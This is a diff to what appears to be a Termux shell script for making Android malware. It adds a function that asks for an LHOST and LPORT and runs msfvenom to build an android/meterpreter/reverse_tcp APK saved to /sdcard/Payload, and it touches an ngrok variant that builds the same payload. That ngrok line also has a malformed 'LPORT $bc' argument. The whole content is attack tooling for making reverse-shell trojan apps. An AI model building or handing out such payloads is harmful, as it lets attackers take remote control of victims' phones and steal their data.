@@ -108,6 +108,28 @@ bin() {
 			check
 			msfconsole
 			}
+			normal () {
+				echo
+				random
+				echo -e -n "Enter LHOST : \033[0m"
+				read bb
+				if [ $bb ];then
+				echo
+				sleep 1
+				random
+				echo -e -n "Enter LPORT : \033[0m"
+				fi
+				read cc
+				if [ $cc ];then
+				echo
+				random
+				printf "Plase wait ..\n"
+				msfvenom -p android/meterpreter/reverse_tcp LHOST=$bb LPORT=$cc R > /sdcard/Payload/Payload.apk
+				random
+				printf "\n\n Successfully saved Payload \033[1;91m(\033[0m/sdcard/Payload\033[1;91m)\n\n"
+				toilet -f font -F metal Exiting
+				fi
+				}
 				ng() {
 					pcheck
 					ngcheck
@@ -138,7 +160,8 @@ bin() {
 					printf "\033[1;92m Please wait .. Creating Your payload\n\n"
 					msfvenom -p android/meterpreter/reverse_tcp LHOST=$ab LPORT $bc R > /sdcard/Payload/Ngrok-Payload.apk
 					fi
-					echo
+					random
+					printf "\n\n Successfully saved Payload \033[1;91m(\033[0m/sdcard/Payload\033[1;91m)\n\n"
 					toilet -f font -F metal Exiting
 					}
 					py() {
